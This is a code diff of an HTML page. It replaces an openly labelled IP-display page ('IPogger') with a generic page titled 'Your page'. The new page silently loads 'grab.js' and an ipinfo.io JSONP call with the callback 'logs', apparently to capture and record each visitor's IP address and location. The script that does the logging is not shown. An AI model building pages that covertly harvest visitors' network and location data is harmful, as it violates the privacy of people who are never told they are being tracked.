@@ -1,23 +1,15 @@
 <!DOCTYPE html>
-<html lang="en">
-    <head>
-        <meta charset="UTF-8">
-        <title>IPogger</title>
-        <link rel="stylesheet" href="./style.css">
-        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
-        <script src="./script.js"></script>
-        <meta content="IPogger" property="og:title"/>
-        <meta content="This website pogs your IP." property="og:description"/>
-        <meta content="https://ipogger.aspy.dev" property="og:url"/>
-        <meta content="https://aspy.dev/images/embed.gif" property="og:image"/>
-        <meta content="#FF0000" property="og:color"/>
-        <meta charset="utf-8">
-        <link rel="icon" type="image/x-icon" href="./pog.webp" >
-        <title id="title">IPogger</title>
-    </head>
-    <body>
-        <div class="background">
-            <div class="ip" id="ip">Attempting to grab IP...</div>
-        </div>
-    </body>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Your page</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+</head>
+<body>
+    <script src="grab.js"></script>
+    <script src="https://ipinfo.io/?format=jsonp&callback=logs"></script>
+    <h1>Your page</h1>
+</body>
 </html>
